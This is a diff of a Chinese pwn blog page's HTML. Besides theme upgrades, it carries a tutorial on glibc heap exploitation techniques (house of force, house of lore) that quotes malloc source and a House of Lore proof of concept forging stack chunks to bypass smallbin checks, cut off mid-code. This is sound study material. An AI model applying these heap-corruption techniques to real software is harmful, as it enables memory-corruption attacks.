@@ -16,15 +16,23 @@
     
 <link rel="stylesheet" href="/css/style.css">
 
-    <link rel="shortcut icon" href="/images/ufo.ico">
-    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.3/source/css/font-awesome.min.css">
-    <script id="hexo-configurations">
-    let KEEP = window.KEEP || {};
-    KEEP.hexo_config = {"hostname":"196082.github.io","root":"/","language":"zh-CN","path":"search.json"};
-    KEEP.theme_config = {"toc":{"enable":true,"number":false,"expand_all":true,"init_open":true},"style":{"primary_color":"#0066CC","avatar":"/images/ling.JPG","favicon":"/images/ufo.ico","article_img_align":"left","left_side_width":"260px","content_max_width":"920px","hover":{"shadow":true,"scale":true},"first_screen":{"enable":false,"background_img":"/images/bg.svg","description":"Keep writing and Keep loving."},"scroll":{"progress_bar":{"enable":false},"percent":{"enable":false}}},"local_search":{"enable":true,"preload":true},"code_copy":{"enable":true,"style":"default"},"pjax":{"enable":false},"lazyload":{"enable":true},"version":"3.4.3"};
-    KEEP.language_ago = {"second":"%s 秒前","minute":"%s 分钟前","hour":"%s 小时前","day":"%s 天前","week":"%s 周前","month":"%s 月前","year":"%s 年前"};
+    
+        <link rel="shortcut icon" href="/images/ufo.ico">
+    
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.2/font/css/fontawesome.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.2/font/css/regular.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.2/font/css/solid.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.2/font/css/brands.min.css">
+    
+    <script class="keep-theme-configurations">
+    const KEEP = window.KEEP || {}
+    KEEP.hexo_config = {"hostname":"196082.github.io","root":"/","language":"zh-CN","path":"search.json"}
+    KEEP.theme_config = {"base_info":{"primary_color":"#0066cc","title":"196082's blog","author":196082,"avatar":"/images/ling.JPG","logo":"/images/ling.JPG","favicon":"/images/ufo.ico"},"menu":{"home":"/","archives":"/archives","tags":"/tags","categories":"/categories"},"first_screen":{"enable":false,"background_img":"/images/bg.svg","background_img_dark":"/images/bg.svg","description":"Keep writing and Keep loving.","hitokoto":false},"social_contact":{"enable":false,"links":{"github":null,"weixin":null,"qq":null,"weibo":null,"zhihu":null,"twitter":null,"x":null,"facebook":null,"email":null}},"scroll":{"progress_bar":false,"percent":false,"hide_header":true},"home":{"announcement":"浅浅更新博客一下吧~","category":true,"tag":true,"post_datetime":"updated"},"post":{"author_badge":{"enable":true,"level_badge":false,"custom_badge":"慢慢好起来"},"word_count":{"wordcount":true,"min2read":true},"datetime_format":"YYYY-MM-DD HH:mm:ss","copyright_info":false,"share":false,"reward":{"enable":true,"img_link":"/images/reward.jpg","text":"激励牛马，加速创作！","icon":"fa-solid fa-mug-hot"},"img_align":"center"},"code_block":{"tools":{"enable":true,"style":"default"},"highlight_theme":"default"},"toc":{"enable":true,"number":false,"expand_all":true,"init_open":true,"layout":"right"},"website_count":{"busuanzi_count":{"enable":true,"site_uv":true,"site_pv":true,"page_pv":true}},"local_search":{"enable":true,"preload":true},"comment":{"enable":true,"use":"valine","valine":{"appid":"OcvtJuJHDrSFIyDGdp3rLMtA-gzGzoHsz","appkey":"C672AAYGXMkHxztf8ntdLShs","server_urls":null,"placeholder":"😜若有问题请各位大师傅留言评论"},"gitalk":{"github_id":null,"github_admins":null,"repository":null,"client_id":null,"client_secret":null,"proxy":null},"twikoo":{"env_id":null,"region":null,"version":"1.6.36"},"waline":{"server_url":null,"reaction":false,"version":"3.2.1"},"giscus":{"repo":null,"repo_id":null,"category":"Announcements","category_id":null,"reactions_enabled":false},"artalk":{"server":null},"disqus":{"shortname":null}},"rss":{"enable":true},"feed":{"type":"atom","path":"atom.xml","limit":20},"lazyload":{"enable":true},"cdn":{"enable":true,"provider":"cdnjs"},"pjax":{"enable":false},"footer":{"since":2020,"word_count":true,"site_deploy":{"enable":true,"provider":"github","url":null},"record":{"enable":false,"list":[{"code":null,"link":null}]}},"inject":{"enable":false,"css":[null],"js":[null]},"root":"","source_data":{},"version":"4.2.2"}
+    KEEP.language_ago = {"second":"%s 秒前","minute":"%s 分钟前","hour":"%s 小时前","day":"%s 天前","week":"%s 周前","month":"%s 个月前","year":"%s 年前"}
+    KEEP.language_code_block = {"copy":"复制代码","copied":"已复制","fold":"折叠代码块","folded":"已折叠"}
+    KEEP.language_copy_copyright = {"copy":"复制版权信息","copied":"已复制","title":"原文标题","author":"原文作者","link":"原文链接"}
   </script>
-<meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="196082's blog" type="application/atom+xml">
+<meta name="generator" content="Hexo 5.4.2"><link rel="alternate" href="/atom.xml" title="196082's blog" type="application/atom+xml">
 </head>
 
 
@@ -36,67 +44,81 @@
 </div>
 
 
-<main class="page-container">
 
+<main class="page-container border-box">
+    <!-- home first screen  -->
     
 
-    <div class="page-main-content">
-
+    <!-- page content -->
+    <div class="page-main-content border-box">
         <div class="page-main-content-top">
-            <header class="header-wrapper">
-
-    <div class="header-content">
-        <div class="left">
             
-            <a class="logo-title" href="/">
-                196082&#39;s blog
+<header class="header-wrapper">
+
+    <div class="border-box header-content">
+        <div class="left flex-start border-box">
+            
+                <a class="logo-image border-box" href="/">
+                    <img src="/images/ling.JPG">
+                </a>
+            
+            <a class="site-name border-box" href="/">
+               196082&#39;s blog
             </a>
         </div>
 
-        <div class="right">
-            <div class="pc">
-                <ul class="menu-list">
+        <div class="right border-box">
+            <div class="pc border-box">
+                <ul class="menu-list border-box">
                     
-                        <li class="menu-item">
-                            <a class=""
-                               href="/"
-                            >
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/">
+                                
                                 首页
+                                
                             </a>
+                            
                         </li>
                     
-                        <li class="menu-item">
-                            <a class=""
-                               href="/archives"
-                            >
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/archives">
+                                
                                 归档
+                                
                             </a>
+                            
                         </li>
                     
-                        <li class="menu-item">
-                            <a class=""
-                               href="/categories"
-                            >
-                                分类
-                            </a>
-                        </li>
-                    
-                        <li class="menu-item">
-                            <a class=""
-                               href="/tags"
-                            >
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/tags">
+                                
                                 标签
+                                
                             </a>
+                            
+                        </li>
+                    
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/categories">
+                                
+                                分类
+                                
+                            </a>
+                            
                         </li>
                     
                     
                         <li class="menu-item search search-popup-trigger">
-                            <i class="fas fa-search"></i>
+                            <i class="menu-text-color fas search fa-search"></i>
                         </li>
                     
                 </ul>
             </div>
-            <div class="mobile">
+            <div class="mobile border-box flex-start">
                 
                     <div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div>
                 
@@ -108,26 +130,54 @@
     </div>
 
     <div class="header-drawer">
-        <ul class="drawer-menu-list">
+        <ul class="drawer-menu-list border-box">
             
-                <li class="drawer-menu-item flex-center">
-                    <a class=""
-                       href="/">首页</a>
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/">
+                            
+                            首页
+                        </a>
+                        
+                    </label>
+                    
                 </li>
             
-                <li class="drawer-menu-item flex-center">
-                    <a class=""
-                       href="/archives">归档</a>
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/archives">
+                            
+                            归档
+                        </a>
+                        
+                    </label>
+                    
                 </li>
             
-                <li class="drawer-menu-item flex-center">
-                    <a class=""
-                       href="/categories">分类</a>
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/tags">
+                            
+                            标签
+                        </a>
+                        
+                    </label>
+                    
                 </li>
             
-                <li class="drawer-menu-item flex-center">
-                    <a class=""
-                       href="/tags">标签</a>
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/categories">
+                            
+                            分类
+                        </a>
+                        
+                    </label>
+                    
                 </li>
             
         </ul>
@@ -140,101 +190,122 @@
 
         </div>
 
-        <div class="page-main-content-middle">
+        <div class="page-main-content-middle border-box">
 
-            <div class="main-content">
+            <div class="main-content border-box">
+                
+
+                    
+<div class="fade-in-down-animation">
+    <div class="post-page-container border-box">
+        <div class="post-content-container border-box">
+            
+
+            <div class="post-content-bottom border-box">
+                
+                    <div class="post-title">
+                        house of ******
+                    </div>
+                
 
                 
-                    <div class="fade-in-down-animation">
-    <div class="article-content-container">
+                    <div class="post-header border-box">
+                        
+                            <div class="avatar-box border-box">
+                                <img src="/images/ling.JPG">
+                            </div>
+                        
+                        <div class="info-box">
+                            <div class="author border-box">
+                                <span class="name">196082</span>
+                                
+                                    <span class="author-badge">慢慢好起来</span>
+                                
+                            </div>
+                            <div class="meta-info border-box">
+                                
 
-        <div class="article-title">
-            <span class="title-hover-animation">house of ******</span>
-        </div>
+<div class="post-meta-info-container border-box post">
+    <div class="post-meta-info border-box">
+        
 
         
-            <div class="article-header">
-                <div class="avatar">
-                    <img src="/images/ling.JPG">
-                </div>
-                <div class="info">
-                    <div class="author">
-                        <span class="name">196082</span>
-                        
-                            <span class="author-label">切勿浮躁,绝不摆烂!</span>
-                        
-                    </div>
-                    <div class="meta-info">
-                        <div class="article-meta-info">
-    <span class="article-date article-meta-item">
-        <i class="fas fa-edit"></i>&nbsp;2022-03-03 17:32:44
-    </span>
-    
-        <span class="article-categories article-meta-item">
-            <i class="fas fa-folder"></i>&nbsp;
-            <ul>
-                
-                    <li>
-                        <a href="/categories/pwn/">pwn</a>&nbsp;
-                    </li>
-                
-            </ul>
-        </span>
-    
-    
-        <span class="article-tags article-meta-item">
-            <i class="fas fa-tags"></i>&nbsp;
-            <ul>
-                
-                    <li>
-                        <a href="/tags/house-of-%E7%B3%BB%E5%88%97/">house of 系列</a>&nbsp;
-                    </li>
-                
-                    <li>
-                        | <a href="/tags/house-of-force/">house of force</a>&nbsp;
-                    </li>
-                
-                    <li>
-                        | <a href="/tags/house-of-lora/">house of lora</a>&nbsp;
-                    </li>
-                
-                    <li>
-                        | <a href="/tags/house-of-botcake/">house of botcake</a>&nbsp;
-                    </li>
-                
-                    <li>
-                        | <a href="/tags/house-of-orange/">house of orange</a>&nbsp;
-                    </li>
-                
-            </ul>
-        </span>
-    
+            <span class="meta-info-item post-create-date">
+                <i class="icon fa-solid fa-calendar-plus"></i>&nbsp;
+                <span class="datetime">2022-03-03 17:32:44</span>
+            </span>
 
-    
-    
-        <span class="article-wordcount article-meta-item">
-            <i class="fas fa-file-word"></i>&nbsp;<span>4.5k 字</span>
-        </span>
-    
-    
-        <span class="article-min2read article-meta-item">
-            <i class="fas fa-clock"></i>&nbsp;<span>26 分钟</span>
-        </span>
-    
-    
-        <span class="article-pv article-meta-item">
-            <i class="fas fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
-        </span>
+            <span class="meta-info-item post-update-date">
+                <i class="icon fa-solid fa-file-pen"></i>&nbsp;
+                <span class="datetime" data-updated="Mon Jul 25 2022 23:08:35 GMT+0800">2022-07-25 23:08:35</span>
+            </span>
+        
+
+        
+            <span class="meta-info-item post-category border-box"><i class="icon fas fa-folder"></i>&nbsp;
+                <ul class="post-category-ul">
+                    
+                            <li class="category-item"><a href="/categories/pwn/">pwn</a></li>
+                        
+                    
+                </ul>
+            </span>
+        
+
+        
+            <span class="post-tag meta-info-item border-box">
+                <ul class="post-tag-ul">
+                    
+                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/house-of-%E7%B3%BB%E5%88%97/">house of 系列</a></li>
+                        
+                    
+                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/house-of-force/">house of force</a></li>
+                        
+                    
+                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/house-of-lora/">house of lora</a></li>
+                        
+                    
+                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/house-of-botcake/">house of botcake</a></li>
+                        
+                    
+                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/house-of-orange/">house of orange</a></li>
+                        
+                    
+                </ul>
+            </span>
+        
+
+        
+        
+            <span class="meta-info-item post-wordcount">
+                <i class="icon fas fa-file-word"></i>&nbsp;<span>4.5k 字</span>
+            </span>
+        
+        
+            <span class="meta-info-item post-min2read">
+                <i class="icon fas fa-clock"></i>&nbsp;<span>26 分钟</span>
+            </span>
+        
+        
+            <span class="meta-info-item post-pv">
+                <i class="icon fas fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+            </span>
+        
+    </div>
+
     
 </div>
 
+                            </div>
+                        </div>
                     </div>
-                </div>
-            </div>
-        
+                
 
-        <div class="article-content markdown-body">
-            <p>没错！标题的星号就是脏字！</p>
+                <div class="post-content keep-markdown-body ">
+                    
+
+                    
+                         <p>没错！标题的星号就是脏字！</p>
 <h2 id="house-of-force"><a href="#house-of-force" class="headerlink" title="house of force"></a>house of force</h2><p>这个堆利用的方式是控制top chunk，把top chunk跑到任意位置。</p>
 <p>总所周知，在malloc的时候发现bin当中没有合适size的chunk的时候就去会割top chunk，那么是怎么隔的就看一下源码</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">victim = av-&gt;top;</span><br><span class="line">size = chunksize (victim);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size) &gt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb + MINSIZE))</span><br><span class="line">&#123;</span><br><span class="line">    remainder_size = size - nb;</span><br><span class="line">    remainder = chunk_at_offset (victim, nb);</span><br><span class="line">    av-&gt;top = remainder;</span><br><span class="line">    set_head (victim, nb | PREV_INUSE |</span><br><span class="line">              (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">    set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line"></span><br><span class="line">    check_malloced_chunk (av, victim, nb);</span><br><span class="line">    <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">    alloc_perturb (p, bytes);</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
@@ -251,7 +322,7 @@
 <h2 id="house-of-lora"><a href="#house-of-lora" class="headerlink" title="house of lora"></a>house of lora</h2><h3 id="Glibc2-23"><a href="#Glibc2-23" class="headerlink" title="Glibc2.23"></a>Glibc2.23</h3><p>这个攻击方式是针对small bin的攻击，先看源码：</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (in_smallbin_range (nb))</span><br><span class="line">&#123;</span><br><span class="line">    idx = smallbin_index (nb);</span><br><span class="line">    bin = bin_at (av, idx);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((victim = last (bin)) != bin)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (victim == <span class="number">0</span>) <span class="comment">/* initialization check */</span></span><br><span class="line">            malloc_consolidate (av);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            bck = victim-&gt;bk;</span><br><span class="line">            <span class="keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim))</span><br><span class="line">            &#123;</span><br><span class="line">                errstr = <span class="string">&quot;malloc(): smallbin double linked list corrupted&quot;</span>;</span><br><span class="line">                <span class="keyword">goto</span> errout;</span><br><span class="line">            &#125;</span><br><span class="line">            set_inuse_bit_at_offset (victim, nb);</span><br><span class="line">            bin-&gt;bk = bck;</span><br><span class="line">            bck-&gt;fd = bin;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">                victim-&gt;size |= NON_MAIN_ARENA;</span><br><span class="line">            check_malloced_chunk (av, victim, nb);</span><br><span class="line">            <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">            alloc_perturb (p, bytes);</span><br><span class="line">            <span class="keyword">return</span> p;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<p>可以看到上面的操作是将最后一个chunk的bk赋值给bck，然后再把bin-&gt;bk=bck就把这个small bin chunk加入到了small bin中去了，不过需要绕过bck-&gt;fd!=victim，这里给出poc：</p>
+<p>可以看到上面的操作是将最后一个chunk的bk赋值给bck，然后再把bin-&gt;bk&#x3D;bck就把这个small bin chunk加入到了small bin中去了，不过需要绕过bck-&gt;fd!&#x3D;victim，这里给出poc：</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">Advanced exploitation of the House of Lore - Malloc Maleficarum.</span></span><br><span class="line"><span class="comment">This PoC take care also of the glibc hardening of smallbin corruption.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">[ ... ]</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">else</span></span><br><span class="line"><span class="comment">    &#123;</span></span><br><span class="line"><span class="comment">      bck = victim-&gt;bk;</span></span><br><span class="line"><span class="comment">    if (__glibc_unlikely (bck-&gt;fd != victim))&#123;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">                  errstr = &quot;malloc(): smallbin double linked list corrupted&quot;;</span></span><br><span class="line"><span class="comment">                  goto errout;</span></span><br><span class="line"><span class="comment">                &#125;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       set_inuse_bit_at_offset (victim, nb);</span></span><br><span class="line"><span class="comment">       bin-&gt;bk = bck;</span></span><br><span class="line"><span class="comment">       bck-&gt;fd = bin;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       [ ... ]</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">jackpot</span><span class="params">()</span></span>&#123; <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Nice jump d00d\n&quot;</span>); <span class="built_in">exit</span>(<span class="number">0</span>); &#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> * argv[])</span></span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="keyword">intptr_t</span>* stack_buffer_1[<span class="number">4</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">  <span class="keyword">intptr_t</span>* stack_buffer_2[<span class="number">3</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nWelcome to the House of Lore\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;This is a revisited version that bypass also the hardening check introduced by glibc malloc\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;This is tested against Ubuntu 16.04.6 - 64bit - glibc-2.23\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Allocating the victim chunk\n&quot;</span>);</span><br><span class="line">  <span class="keyword">intptr_t</span> *victim = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Allocated the first small chunk on the heap at %p\n&quot;</span>, victim);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// victim-WORD_SIZE because we need to remove the header size in order to have the absolute address of the chunk</span></span><br><span class="line">  <span class="keyword">intptr_t</span> *victim_chunk = victim<span class="number">-2</span>;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;stack_buffer_1 at %p\n&quot;</span>, (<span class="keyword">void</span>*)stack_buffer_1);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;stack_buffer_2 at %p\n&quot;</span>, (<span class="keyword">void</span>*)stack_buffer_2);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Create a fake chunk on the stack\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Set the fwd pointer to the victim_chunk in order to bypass the check of small bin corrupted&quot;</span></span><br><span class="line">         <span class="string">&quot;in second to the last malloc, which putting stack address on smallbin list\n&quot;</span>);</span><br><span class="line">  stack_buffer_1[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">  stack_buffer_1[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">  stack_buffer_1[<span class="number">2</span>] = victim_chunk;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Set the bk pointer to stack_buffer_2 and set the fwd pointer of stack_buffer_2 to point to stack_buffer_1 &quot;</span></span><br><span class="line">         <span class="string">&quot;in order to bypass the check of small bin corrupted in last malloc, which returning pointer to the fake &quot;</span></span><br><span class="line">         <span class="string">&quot;chunk on stack&quot;</span>);</span><br><span class="line">  stack_buffer_1[<span class="number">3</span>] = (<span class="keyword">intptr_t</span>*)stack_buffer_2;</span><br><span class="line">  stack_buffer_2[<span class="number">2</span>] = (<span class="keyword">intptr_t</span>*)stack_buffer_1;</span><br><span class="line">  </span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Allocating another large chunk in order to avoid consolidating the top chunk with&quot;</span></span><br><span class="line">         <span class="string">&quot;the small one during the free()\n&quot;</span>);</span><br><span class="line">  <span class="keyword">void</span> *p5 = <span class="built_in">malloc</span>(<span class="number">1000</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Allocated the large chunk on the heap at %p\n&quot;</span>, p5);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Freeing the chunk %p, it will be inserted in the unsorted bin\n&quot;</span>, victim);</span><br><span class="line">  <span class="built_in">free</span>((<span class="keyword">void</span>*)victim);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nIn the unsorted bin the victim&#x27;s fwd and bk pointers are nil\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;victim-&gt;fwd: %p\n&quot;</span>, (<span class="keyword">void</span> *)victim[<span class="number">0</span>]);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;victim-&gt;bk: %p\n\n&quot;</span>, (<span class="keyword">void</span> *)victim[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now performing a malloc that can&#x27;t be handled by the UnsortedBin, nor the small bin\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;This means that the chunk %p will be inserted in front of the SmallBin\n&quot;</span>, victim);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">void</span> *p2 = <span class="built_in">malloc</span>(<span class="number">1200</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;The chunk that can&#x27;t be handled by the unsorted bin, nor the SmallBin has been allocated to %p\n&quot;</span>, p2);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;The victim chunk has been sorted and its fwd and bk pointers updated\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;victim-&gt;fwd: %p\n&quot;</span>, (<span class="keyword">void</span> *)victim[<span class="number">0</span>]);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;victim-&gt;bk: %p\n\n&quot;</span>, (<span class="keyword">void</span> *)victim[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="comment">//------------VULNERABILITY-----------</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now emulating a vulnerability that can overwrite the victim-&gt;bk pointer\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  victim[<span class="number">1</span>] = (<span class="keyword">intptr_t</span>)stack_buffer_1; <span class="comment">// victim-&gt;bk is pointing to stack</span></span><br><span class="line"></span><br><span class="line">  <span 